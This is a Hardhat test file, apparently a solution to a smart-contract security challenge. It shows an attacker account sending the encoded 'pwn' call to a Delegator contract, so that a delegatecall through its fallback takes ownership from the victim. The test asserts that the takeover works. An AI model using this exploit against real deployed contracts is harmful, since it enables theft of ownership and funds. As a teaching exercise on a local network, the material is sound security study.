import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Delegate", function () {
  // We define a fixture to reuse the same setup in every test.
  // We use loadFixture to run this setup once, snapshot that state,
  // and reset Hardhat Network to that snapshot in every test.
  async function deployFixture() {

    // Contracts are deployed using the first signer/account by default
    const [victim, attacker] = await ethers.getSigners();

    const Delegate = await ethers.getContractFactory("Delegate");
    const delegate = await Delegate.connect(victim).deploy(victim.address);

    const Delegator = await ethers.getContractFactory("Delegator");
    const delegator = await Delegator.connect(victim).deploy(delegate.address);

    return { delegate, delegator, victim, attacker };
  }


  it("Attacker should be able to abuse delegatecall and transfer ownership", async function () {
    const { delegate, delegator, victim, attacker } = await loadFixture(deployFixture);

    expect(await delegate.owner()).to.equal(victim.address)
    expect(await delegator.owner()).to.equal(victim.address)
    
    // construct a message to trigger the fallback with data to call the delegate contract to change ownership
    const vulnerableDelegateMethod = delegate.interface.encodeFunctionData("pwn")
    const tx = await attacker.sendTransaction({to: delegator.address, data: vulnerableDelegateMethod})
    await tx.wait()

    expect(await delegate.owner()).to.equal(victim.address)
    expect(await delegator.owner()).to.equal(attacker.address)
  });

});
